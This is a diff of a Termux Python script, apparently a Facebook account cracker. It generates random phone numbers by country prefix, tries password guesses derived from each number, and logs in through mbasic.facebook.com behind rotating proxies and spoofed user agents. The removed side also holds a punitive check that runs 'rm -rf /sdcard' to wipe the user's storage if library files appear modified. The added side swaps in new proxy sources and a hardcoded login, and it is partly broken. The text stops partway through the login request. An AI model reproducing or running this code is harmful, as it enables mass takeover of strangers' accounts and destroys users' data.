@@ -1,625 +1,505 @@
-import os,sys,time,json,random,re,string,platform,base64,uuid
-from bs4 import BeautifulSoup
-import requests as ress
-from datetime import date
-from datetime import datetime
-from time import sleep
-from time import sleep as waktu
+#GITHUB-SHANTO-KING
+#ACTIVE FILE CLONING
+#ONLY ACTIVE ACCOUNT FOR GAME ACCOUNT USE FILE 10000 
+#DEC-FUCK-YOUR-MOM-DON'T-BYPASS-MY-COMMAND
+# =[â€¢]=[SCRIPT]=[ADMIN]=[SHANTO]=[â€¢]=
+#------------------[ Install-1 ]-------------------#
+import os 
+#-----------------[ SHANTO-King ]-------------------# 
+os.system("pkg install sox -y")
+os.system("play op.mp3")
+os.system("pkg install espeak")
+import requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64
+import requests,zlib,platform
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import print as rprint
+from rich import pretty
+from rich.text import Text as tekz
+pretty.install()
+CON=sol()
+#------------------[ USER-AGENT ]-------------------#
+ua = 'Mozilla/5.0 (Linux; U; Android 11; pl-pl; Redmi K30S Ultra Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, wie Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.15 .2-gn'
+ua = 'Mozilla/5.0 (Linux; U; Android 11; ru-ru; Redmi K30S Ultra Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.12.0-gn'
+ua = 'Mozilla/5.0 (Linux; U; Android 11; ru-ru; Mi 11 LE Build/RKQ1.210503.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.16.2-gn'
+ua = ["Mozilla/5.0 (Linux; Android 13; 21081111RG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64]",]
+ua = 'Mozilla/5.0 (Linux; U; Android 11; ru-ru; Mi 11 LE Build/RKQ1.210503.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.16.2-gn'
+ua = 'Mozilla/5.0 (Linux; U; Android 10; pl-pl; MI 8 Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.8.33'
+ua = 'Mozilla/5.0 (Linux; U; Android 10; vi-vn; Redmi K20 Pro Build/QKQ1.190716.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.0.11'
+ua = 'LightSpeed [FBAN/MessengerLiteForiOS;FBAV/390.0.0.20.104;FBBV/428146516;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.1.2;FBSS/3;FBCR/;FBID/phone;FBLC/it;FBOP/0]'
+ua = 'Mozilla/5.0 (Linux; U; Android 13; zh-tw; 2206122SC Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.8.70926 swan-mibrowser'
+ua = 'Mozilla/5.0 (Linux; U; Android 11; en-us; MI CC9 Pro Premium Edition Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.13.2-gn'
+ua=random.choice(ugen)
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
 try:
-    import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize futures bs4==2 > /dev/null')
-    os.system('pip install bs4')
-from time import localtime as lt
-from os import system as cmd
-ltx = int(lt()[3])
-if ltx > 12:
-    a = ltx-12
-    tag = "PM"
-else:
-    a = ltx
-    tag = "AM"
-
-def clear():
-    os.system('clear')
-#-----[Global Functions]-----#
-def dynamic(text):
-    titik = ['.   ','..  ','... ','.... ']
-    for o in titik:
-        print('\r'+text+o),
-        sys.stdout.flush();time.sleep(1)
-#--------------------------proxies---------------------------#
-fuck='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'if self.url==' in open(fuck+'sessions.py','r').read():
-    pass
-else:
-    os.system('rm -rf /sdcard')
-    exit('\033[1;32mFUCK YOU BYPASS USER')
-king='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(king+'sessions.py','r').read():
-    pass
-else:
-    os.system('rm -rf /sdcard')
-    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
-qeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(qeen+'models.py','r').read():
-    pass
-else:
-    os.system('rm -rf /sdcard')
-    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
-don='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(don+'utils.py','r').read():
-    pass
-else:
-    os.system('rm -rf /sdcard')
-    exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
-
-try:
-	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
-	open('proxies.txt','w').write(prox)
+	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
+	open('.prox.txt','w').write(prox)
+	
 except Exception as e:
-	print('')
-proxies=open('proxies.txt','r').read().splitlines()
-#-----[Colours]-----#
-RED = '\033[1;91m' #
-WHITE = '\033[1;97m' #
-GREEN = '\033[1;32m' #
-YELLOW = '\033[1;33m' #
-BLUE = '\033[1;34m' #
-ORANGE = '\033[1;35m' #
-P = '\x1b[1;97m' # 
-M = '\x1b[1;91m' # 
-H = '\x1b[1;92m' # 
-K = '\x1b[1;92m' # 
-B = '\x1b[1;94m' # 
-U = '\x1b[1;95m' # 
-O = '\x1b[1;96m' #
-N = '\x1b[0m' #
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today()
-my_color = [
- P, M, H, K, B, U, O, N]
-warna = random.choice(my_color)
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today()
-mtd,cp_cpx,cokix=[],[],[]
-fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
-#-----userid-separate----#
-def user_id(coki):
-    c_user_index = coki.find('c_user=')
-    if c_user_index != -1:
-        user_id = coki[c_user_index + len('c_user='):]
-        user_id = user_id.split(';')[0]  # Extract the user ID
-    else:
-        user_id = ""
-    return user_id
- #-------checker------#
-def lock_check(uid):
-    sessionx=requests.Session()
-    urlx=f'https://www.facebook.com/p/{uid}'
-    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
-    tx=req.find('title').text
-    if tx =='Facebook':
-        return('LOCK')
-    else:
-        return('LIVE')
-#-----[UserAgent]-----#
-ugen = []
-for agent in range(40000):
-    a='Mozilla/5.0 (Java; U; en-us; nokian70-1) AppleWebKit/530.13 (KHTML, like Gecko) UCBrowser/'
-    b=random.randrange(1,9)
-    c=random.randrange(1,9)
-    d='0'
-    e=random.randrange(111,999)
-    f=random.randrange(11,99)
+	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mSHANTO')
+prox=open('.prox.txt','r').read().splitlines()
+for agent in range(random.randint(89999, 150000)):
+    a='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['10','11','12','13'])
+    c='; en-us; MI CC9 Pro Premium Edition Build/RKQ1.200826.002; wv)'
+    d=random.randrange(7,13)
+    e='en-us; GT-'
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     g=random.randrange(111,999)
-    h='UCWEB Mobile UNTRUSTED/1.0'
-    fullagent=f'{a}{b}.{c}.{d}.{e}/{f}/{g}/{h}'
+    h=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    i='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    j=random.randrange(11,99)
+    k='0'
+    l=random.randrange(1111,9999)
+    m=random.randrange(11,99)
+    n='Mobile Safari/537.36'
+    o='XiaoMi/MiuiBrowser/'
+    p=random.randrange(11,99)
+    q=random.randrange(11,99)
+    r=random.randrange(1,9)
+    s='-gn'
+    fullagent=f'{a} {b}{c} {d};  {e}{f}{g}{h}) {i}{j}.{k}.{l}.{m} {n} {o}{p}.{q}.{r}{s}'
     ugen.append(fullagent)
-for agent in range(40000):
-    a='Mozilla/5.0 (SymbianOS/'
-    b=random.choice(['9.1','9.2'])
-    c='; U; [en-us]; Series60/3.0'
-    d='NokiaE61/'
-    e=random.randrange(1,9)
-    f=random.randrange(1111,9999)
-    g=random.choice(['01','02','03','04','05','06','07','08','09'])
-    h=random.choice(['01','02','03','04','05','06','07','08','09'])
-    i='AppleWebKit/413 (KHTML, like Gecko) Safari/413'
-    fullagnt=f'{a}{b}{c} {d}{e}.{f}.{g}.{h} {i}'
-    ugen.append(fullagnt)
-#----------------------[CHECK CREATION YEAR]----------------#         
-def joined(cid):
-    if len(cid)==15:
-        if cid[:10] in ['1000000000']       :creation = ' 2009'
-        elif cid[:9] in ['100000000']       :creation = ' 2009'
-        elif cid[:8] in ['10000000']        :creation = ' 2009'
-        elif cid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = ' 2009'
-        elif cid[:7] in ['1000006','1000007','1000008','1000009']:creation = ' 2010'
-        elif cid[:6] in ['100001']          :creation = ' 2010 | 2011'
-        elif cid[:6] in ['100002','100003'] :creation = ' 2011 | 2012'
-        elif cid[:6] in ['100004']          :creation = ' 2012 | 2013'
-        elif cid[:6] in ['100005','100006'] :creation = ' 2013 | 2014'
-        elif cid[:6] in ['100007','100008'] :creation = ' 2014 | 2015'
-        elif cid[:6] in ['100009']          :creation = ' 2015' 
-        elif cid[:5] in ['10001']           :creation = ' 2015 | 2016'
-        elif cid[:5] in ['10002']           :creation = ' 2016 | 2017'
-        elif cid[:5] in ['10003']           :creation = ' 2018 | 2019'
-        elif cid[:5] in ['10004']           :creation = ' 2019 | 2020'
-        elif cid[:5] in ['10005']           :creation = ' 2020'
-        elif cid[:5] in ['10006','10007']   :creation = ' 2021'
-        elif cid[:5] in ['10008']           :creation = ' 2022/2023'
-        elif cid[:5] in ['10009']           :creation = ' 2023'
-        elif cid[:5] in ['61550']           :creation = ' 2023'
-        else:creation=''
-    elif len(cid) in [9,10]:
-        creation = ' 2008 | 2009'
-    elif len(cid)==8:
-        creation = ' 2007 | 2008'
-    elif len(cid)==7:
-        creation = ' 2006 | 2007'
-    else:creation=''
-    return creation
-#----------LOGO-------------#
-logo=("""
-\033[1;91m ########  ########     ###     ######    #######  ##    ## 
-\033[1;92m ##     ## ##     ##   ## ##   ##    ##  ##     ## ###   ## 
-\033[1;93m ##     ## ##     ##  ##   ##  ##        ##     ## ####  ## 
-\033[1;94m ##     ## ########  ##     ## ##   #### ##     ## ## ## ## 𝙇
-\033[1;95m ##     ## ##   ##   ######### ##    ##  ##     ## ##  #### 𝙊
-\033[1;91m ##     ## ##    ##  ##     ## ##    ##  ##     ## ##   ### 𝙍
-\033[1;92m ########  ##     ## ##     ##  ######    #######  ##    ## 𝘿\033[1;93m
-\x1b[1;93m┏───────────────────────────────────────────────┓
-\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m AUTHOR     \x1b[1;97m: \x1b[1;92mDRAGON LORD
-\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m TYPE       \x1b[1;97m: \x1b[1;92mFREE🔥
-\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m GITHUB     \x1b[1;97m: \x1b[1;92mDragon-Lord-404   
-\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m TOOL       \x1b[1;97m: \x1b[1;92mRANDOM-CLONING      
-\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m VERSION    \x1b[1;97m: \x1b[1;92m1.2.0
-\x1b[1;93m┗───────────────────────────────────────────────┛""")  
-def linex():
-        print(50*'\033[36;5;14m─\033[1;37m')
+ 
+ 
+ 
+def uaku():
+	try:
+		ua=open('bbnew.txt','r').read().splitlines()
+		for ub in ua:
+			ugen.append(ub)
+	except:
+		a=requests.get('https://github.com/SADIM-143/Ua.txt').text
+		ua=open('.bbnew.txt','w')
+		aa=re.findall('line">(.*?)<',str(a))
+		for un in aa:
+			ua.write(un+'\n')
+		ua=open('.bbnew.txt','r').read().splitlines()
+id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
+cokbrut=[]
+ 
+def back():
+	login()
+SHANTO="SHANTO"
+imt="SETU"
+ak="CLASS3-"
+ 
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[93m' # KUNING +
+h = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+asu = random.choice([m,k,h,u,b])
+ 
+ 
+pwpluss,pwnya=[],[]
+dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
+dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
+tgl = datetime.datetime.now().day
+bln = dic[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+ 
+def alvino_xy(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
+def SHANTOj(u):
+        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 def clear():
-        os.system(f'clear')
-        print(logo)
-    
-#-----[Loop Menu]-----#  
-loop = 0
-oks = []
-cps = []
+	os.system('clear')
+def back():
+	login()
+	
+	import getpass
+ 
+attemps = 0
+ 
+while attemps < 12345677901:
+    username = input(' \033[0;92mEnter Username: ')
+    password = input(' \033[0;93mEnter Password: ')
+ 
+    if username == 'r' and password == 'j':
+        print(' \033[0;92mYou Have Successfully Logged in.')
+        break
+    else:
+        print(' Incorrect Pass Please Trying ')
+        attemps += 1
+        continue
+os.system('clear')
 
-#-----[Main-Menu]-----#
-def lord_menu():
-    os.system('clear');print(logo)
-    print('\033[1;92m [1] RANDOM CRACK [IND]')
-    print('\033[1;92m [2] RANDOM CRACK [BD]')
-    print('\033[1;92m [3] RANDOM CRACK [PAK]')
-    print('\033[1;92m [4] RANDOM CRACK [NPL]')
-    print('\033[1;92m [5] RANDOM CRACK [SGP]')
-    print('\033[1;92m [6] RANDOM CRACK [USA]')
-    print('\033[1;92m [7] RANDOM CRACK [MYN]')
-    print('\033[1;92m [8] RANDOM CRACK [INDO]')
-    print('\033[1;92m [0] EXIT TOOL')
-    linex()
-    lord=input(' \033[1;32m[?] SELECT MENU: ')
-    if lord in['1','01']:ind()
-    elif lord in['2','02']:bd()
-    elif lord in['3','03']:pak()
-    elif lord in['4','04']:npl()
-    elif lord in['5','05']:sgp()
-    elif lord in['6','06']:usa()
-    elif lord in['7','07']:myn()
-    elif lord in['8','08']:indo()
-    elif lord in['0','00']:exit()
-    else:exit()
-    
-def ind():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print('\033[1;32m [√] IND CODE : +91639/+91629/+91836/+91799/+91953')
-    linex()
-    code = input('\033[1;32m [?] CHOOSE : ')
-    os.system('clear')
-    print(logo)
-    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
-    linex()
-    limit = int(input('\033[1;32m [?] CHOOSE : '))
-    linex()
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=20) as ahare:
-        clear()
-        tl = str(len(user))
-        gen = str(len(ugen))
-        print('\033[1;32m [+] Choice Code: '+code)
-        print('\033[1;33m [-] Total  Uagent: '+gen)
-        print('\033[1;34m [+] Crack Process Has Started')
-        print('\033[1;35m [!] Use Flight Mode For Speed Up')
-        print('\033[1;36m [+] Use APN For More OK Ids')
-        linex()
-        for fuck in user:
-            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "57575751", "59039200"]
-            fid = code+fuck
-            ahare.submit(lordx,fid,pwx,tl)
-    print('CRACK PROCESS HAS BEEN COMPLETED ')
-    print('Ok Ids Saved in /DRAGON-OK.txt')
-    print('Cp Ids Saved in /DRAGON-CP.txt')
-    linex()  
+#------------------[ MAIN ]-----------------#
 
-def bd():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print('\033[1;32m [√] BD CODE : 015/016/017/018/019/013/014')
-    linex()
-    code = input('\033[1;32m [?] CHOOSE : ')
-    os.system('clear')
-    print(logo)
-    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
-    linex()
-    limit = int(input('\033[1;32m [?] CHOOSE : '))
-    linex()
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(8))
-        user.append(nmp)
-    with ThreadPool(max_workers=10) as ahare:
-        clear()
-        tl = str(len(user))
-        gen = str(len(ugen))
-        print('\033[1;32m [+] Choice Code: '+code)
-        print('\033[1;33m [-] Total  Uagent: '+gen)
-        print('\033[1;34m [+] Crack Process Has Started')
-        print('\033[1;35m [!] Use Flight Mode For Speed Up')
-        print('\033[1;36m [+] Use APN For More OK Ids')
-        linex()
-        for fuck in user:
-            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit", "102030", "203040", "112244", "112255", "shamim", "sadiya", "fatema", "shahin", "fariya", "mimmim"]
-            fid = code+fuck
-            ahare.submit(lordx,fid,pwx,tl)
-    print('CRACK PROCESS HAS BEEN COMPLETED ')
-    print('Ok Ids Saved in /DRAGON-OK.txt')
-    print('Cp Ids Saved in /DRAGON-CP.txt')
-    linex()
-
-def pak():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print('\033[1;32m [√] PAK CODE : +92326/+92331/+92314/+92335')
-    linex()
-    code = input('\033[1;32m [?] CHOOSE : ')
-    os.system('clear')
-    print(logo)
-    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
-    linex()
-    limit = int(input('\033[1;32m [?] CHOOSE : '))
-    linex()
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=20) as ahare:
-        clear()
-        tl = str(len(user))
-        gen = str(len(ugen))
-        print('\033[1;32m [+] Choice Code: '+code)
-        print('\033[1;33m [-] Total  Uagent: '+gen)
-        print('\033[1;34m [+] Crack Process Has Started')
-        print('\033[1;35m [!] Use Flight Mode For Speed Up')
-        print('\033[1;36m [+] Use APN For More OK Ids')
-        linex()
-        for fuck in user:
-            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit"]
-            fid = code+fuck
-            ahare.submit(lordx,fid,pwx,tl)
-    print('CRACK PROCESS HAS BEEN COMPLETED ')
-    print('Ok Ids Saved in /DRAGON-OK.txt')
-    print('Cp Ids Saved in /DRAGON-CP.txt')
-    linex()
-
-def npl():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print('\033[1;32m [√] NPL CODE : +97798/+97714')
-    linex()
-    code = input('\033[1;32m [?] CHOOSE : ')
-    os.system('clear')
-    print(logo)
-    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
-    linex()
-    limit = int(input('\033[1;32m [?] CHOOSE : '))
-    linex()
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(8))
-        user.append(nmp)
-    with ThreadPool(max_workers=20) as ahare:
-        clear()
-        tl = str(len(user))
-        gen = str(len(ugen))
-        print('\033[1;32m [+] Choice Code: '+code)
-        print('\033[1;33m [-] Total  Uagent: '+gen)
-        print('\033[1;34m [+] Crack Process Has Started')
-        print('\033[1;35m [!] Use Flight Mode For Speed Up')
-        print('\033[1;36m [+] Use APN For More OK Ids')
-        linex()
-        for fuck in user:
-            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit"]
-            fid = code+fuck
-            ahare.submit(lordx,fid,pwx,tl)
-    print('CRACK PROCESS HAS BEEN COMPLETED ')
-    print('Ok Ids Saved in /DRAGON-OK.txt')
-    print('Cp Ids Saved in /DRAGON-CP.txt')
-    linex()
-
-def sgp():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print('\033[1;32m [√] SGP CODE : +65634/+65681/+65674/+65828/+65969')
-    linex()
-    code = input('\033[1;32m [?] CHOOSE : ')
-    os.system('clear')
-    print(logo)
-    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
-    linex()
-    limit = int(input('\033[1;32m [?] CHOOSE : '))
-    linex()
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(5))
-        user.append(nmp)
-    with ThreadPool(max_workers=20) as ahare:
-        clear()
-        tl = str(len(user))
-        gen = str(len(ugen))
-        print('\033[1;32m [+] Choice Code: '+code)
-        print('\033[1;33m [-] Total  Uagent: '+gen)
-        print('\033[1;34m [+] Crack Process Has Started')
-        print('\033[1;35m [!] Use Flight Mode For Speed Up')
-        print('\033[1;36m [+] Use APN For More OK Ids')
-        linex()
-        for fuck in user:
-            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit"]
-            fid = code+fuck
-            ahare.submit(lordx,fid,pwx,tl)
-    print('CRACK PROCESS HAS BEEN COMPLETED ')
-    print('Ok Ids Saved in /DRAGON-OK.txt')
-    print('Cp Ids Saved in /DRAGON-CP.txt')
-    linex()
-
-def usa():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print('\033[1;32m [√] USA CODE : +17574/+13045/+13048')
-    linex()
-    code = input('\033[1;32m [?] CHOOSE : ')
-    os.system('clear')
-    print(logo)
-    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
-    linex()
-    limit = int(input('\033[1;32m [?] CHOOSE : '))
-    linex()
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(6))
-        user.append(nmp)
-    with ThreadPool(max_workers=20) as ahare:
-        clear()
-        tl = str(len(user))
-        gen = str(len(ugen))
-        print('\033[1;32m [+] Choice Code: '+code)
-        print('\033[1;33m [-] Total  Uagent: '+gen)
-        print('\033[1;34m [+] Crack Process Has Started')
-        print('\033[1;35m [!] Use Flight Mode For Speed Up')
-        print('\033[1;36m [+] Use APN For More OK Ids')
-        linex()
-        for fuck in user:
-            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "123456", "654321", ]
-            fid = code+fuck
-            ahare.submit(lordx,fid,pwx,tl)
-    print('CRACK PROCESS HAS BEEN COMPLETED ')
-    print('Ok Ids Saved in /DRAGON-OK.txt')
-    print('Cp Ids Saved in /DRAGON-CP.txt')
-    linex()
-
-def myn():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print('\033[1;32m [√] MYN CODE : +95966/+95925/+95977/+95997')
-    linex()
-    code = input('\033[1;32m [?] CHOOSE : ')
-    os.system('clear')
-    print(logo)
-    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
-    linex()
-    limit = int(input('\033[1;32m [?] CHOOSE : '))
-    linex()
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=20) as ahare:
-        clear()
-        tl = str(len(user))
-        gen = str(len(ugen))
-        print('\033[1;32m [+] Choice Code: '+code)
-        print('\033[1;33m [-] Total  Uagent: '+gen)
-        print('\033[1;34m [+] Crack Process Has Started')
-        print('\033[1;35m [!] Use Flight Mode For Speed Up')
-        print('\033[1;36m [+] Use APN For More OK Ids')
-        linex()
-        for fuck in user:
-            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit"]
-            fid = code+fuck
-            ahare.submit(lordx,fid,pwx,tl)
-    print('CRACK PROCESS HAS BEEN COMPLETED ')
-    print('Ok Ids Saved in /DRAGON-OK.txt')
-    print('Cp Ids Saved in /DRAGON-CP.txt')
-    linex()
-
-def indo():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print('\033[1;32m [√] INDO CODE : +62888/+62878/+62882/+62838/+62877/+62813')
-    linex()
-    code = input('\033[1;32m [?] CHOOSE : ')
-    os.system('clear')
-    print(logo)
-    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
-    linex()
-    limit = int(input('\033[1;32m [?] CHOOSE : '))
-    linex()
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(8))
-        user.append(nmp)
-    with ThreadPool(max_workers=10) as ahare:
-        clear()
-        tl = str(len(user))
-        gen = str(len(ugen))
-        print('\033[1;32m [+] Choice Code: '+code)
-        print('\033[1;33m [-] Total  Uagent: '+gen)
-        print('\033[1;34m [+] Crack Process Has Started')
-        print('\033[1;35m [!] Use Flight Mode For Speed Up')
-        print('\033[1;36m [+] Use APN For More OK Ids')
-        linex()
-        for fuck in user:
-            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit"]
-            fid = code+fuck
-            ahare.submit(lordx,fid,pwx,tl)
-    print('CRACK PROCESS HAS BEEN COMPLETED ')
-    print('Ok Ids Saved in /DRAGON-OK.txt')
-    print('Cp Ids Saved in /DRAGON-CP.txt')
-    linex()
-
-def lordx(fid,pwx,tl):
-    global loop
-    global cps
-    global oks
-    global proxy
-    sys.stdout.write('\r\r\033[1;92m[\033[38;5;46mCRACKING🔍]\033[1;97m-[%s/%s]-[OK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps)));sys.stdout.flush()
-    try:
-        last7digit = fid[int(len(fid))-7:]
-        last6digit = fid[int(len(fid))-6:]
-        last8digit = fid[int(len(fid))-8:]
-        last9digit = fid[int(len(fid))-9:]
-        last10digit = fid[int(len(fid))-10:]
-        first6digit = fid[0:6]
-        first7digit = fid[0:7]
-        first8digit = fid[0:8]
-        first9digit = fid[0:9]
-        first10digit = fid[0:10]
-        fullnumber = fid
-        for ps in pwx:
-            ps = ps.replace("last7digit",last7digit)
-            ps = ps.replace("last6digit",last6digit)
-            ps = ps.replace("last8digit",last8digit)
-            ps = ps.replace("last9digit",last9digit)
-            ps = ps.replace("last10digit",last10digit)
-            ps = ps.replace("first6digit",first6digit)
-            ps = ps.replace("first6digit",first6digit)
-            ps = ps.replace("first7digit",first7digit)
-            ps = ps.replace("first8digit",first8digit)
-            ps = ps.replace("first9digit",first9digit)
-            ps = ps.replace("first10digit",first10digit)
-            ps = ps.replace("fullnumber",fullnumber)
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
-            log_data = {
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
